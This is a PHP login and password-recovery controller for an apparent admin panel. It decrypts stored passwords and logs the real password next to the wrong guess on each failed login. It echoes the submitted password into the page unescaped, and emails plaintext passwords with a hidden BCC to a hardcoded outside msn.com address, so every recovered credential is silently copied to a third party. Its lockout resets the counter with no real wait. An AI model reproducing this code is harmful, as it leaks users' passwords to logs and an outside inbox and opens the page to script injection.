<?php

class ingresoController{

	static public function IngresoUsuariosController(){


		if(isset($_POST["usuarioIngreso"])){ 

				$datosController = array("usuario"=>$_POST["usuarioIngreso"],
				                     "password"=>$_POST["passwordIngreso"]);

				$respuesta = ingresoModel::IngresoUsuariosModel($datosController);

				 

				$intentos = $respuesta["intentos"];
				$usuarioActual = $_POST["usuarioIngreso"];
				$maximoIntentos = 2;

				if($intentos < $maximoIntentos){

					if( DecriptacionVar($respuesta["password"],Keyboard)  == $_POST["passwordIngreso"]){

						$intentos = 0;

						$datosController = array("usuarioActual"=>$usuarioActual, "actualizarIntentos"=>$intentos);

						$respuestaActualizarIntentos = ingresoModel::intentosModel($datosController);
						

						//session_start();

						$_SESSION["LoginAcceso"] = true;
						$_SESSION["Usuario"] = $respuesta["nombre"];
						$_SESSION["Email"] = $respuesta["email"];
						$_SESSION["Nivel"] = $respuesta["nivel"];
						$_SESSION["Thumbail"] = "views/images/slide/user_".$respuesta["id"].".jpg";
						$_SESSION["Id"] = $respuesta["id"];
						bitacoraController::Registro(" Accedio al sistema");

						header("location:index.php?bq=setting");

					} else{

						++$intentos;

						$datosController = array("usuarioActual"=>$usuarioActual, "actualizarIntentos"=>$intentos);

						$respuestaActualizarIntentos = ingresoModel::intentosModel($datosController);
						bitacoraController::Registro($_POST["usuarioIngreso"]." Error de acceso [".$_POST["passwordIngreso"]."] Real:".DecriptacionVar($respuesta["password"],Keyboard)   );

						echo '<div class="alert alert-danger">Hay un error con el  password: '.$_POST["passwordIngreso"].'</div>';

					}

				}

				else{

						$intentos = 0;

						$datosController = array("usuarioActual"=>$usuarioActual, "actualizarIntentos"=>$intentos);

						$respuestaActualizarIntentos = ingresoModel::intentosModel($datosController);
						bitacoraController::Registro($_POST["usuarioIngreso"]." Error de acceso [".$_POST["passwordIngreso"]."] Real:".DecriptacionVar($respuesta["password"],Keyboard), $_POST["usuarioIngreso"]);

						echo '<div class="alert alert-danger">Ha fallado 3 veces, Intenta dentro de 30 min.</div>';

				}

			 

		}
	}



	static public function RecuperarUser(){

		if(isset($_POST["usuarioRecupera"])){ 



				$email = strtolower($_POST["usuarioRecupera"]);
				 $respuesta = ingresoModel::BuscarUserExisteModel($email);
				 bitacoraController::Registro(" Solicitud de recuperacion contrseña", $_POST["usuarioRecupera"]);


				 if(!empty($respuesta["email"])){
					     /*++++++++++++++++++++++++++++++++++++ 
						 //  Notifiacion usuario
						 ++++++++++++++++++++++++++++++++++++*/
						  require("views/email/class.phpmailer.php");
						  require("views/email/class.smtp.php");
						  
						  
						  $logo = siteController::LogoReturnController();
						  $path = siteController::URLReturnController();
						  $site = siteController::SiteNameReturnController();
 

						  $message ='
						  '.$logo.'
						  <br>
						  Estimado '.$respuesta["nombre"].', estos son sus datos de acceso para '.$site.':<br><br>

						  U: '.$respuesta["email"].'<br>
						  P: '.DecriptacionVar($respuesta["password"],Keyboard).'
						  <br><br>
						  '.$path.'/admin
						  ';

						  $mail = new PHPMailer(); 
						  $mail->IsSMTP();
						  $mail->SMTPAuth = emailAtuh; 
						  $mail->SMTPSecure = emailSecure;
						  $mail->Host = emailHost;
						  $mail->Port = emailPort;
						  $mail->Username = emailUser; 
						  $mail->Password = emailPass; 
						  $mail->From = emailUser; 
						  $mail->FromName = "RealityPro"; 
						  $mail->Subject = "Recuperacion de usuario"; 
						  $mail->AddAddress($respuesta["email"]); 
						  $mail->AddBCC('ivannss@msn.com'); 
						  //Attach an image file
						  //$mail->addAttachment('images/phpmailer_mini.png');
						  $mail->Body = $message; 
						  $mail->MsgHTML($message);  
						  if(!$mail->Send()) echo $mail->ErrorInfo;
						  echo '<div class="alert alert-success">Se ha enviado su contraseña a su email.</div>';
				}else{
					    echo '<div class="alert alert-danger">El email no esta dado de alta en el sitio.</div>';
				}  

		}

	}








}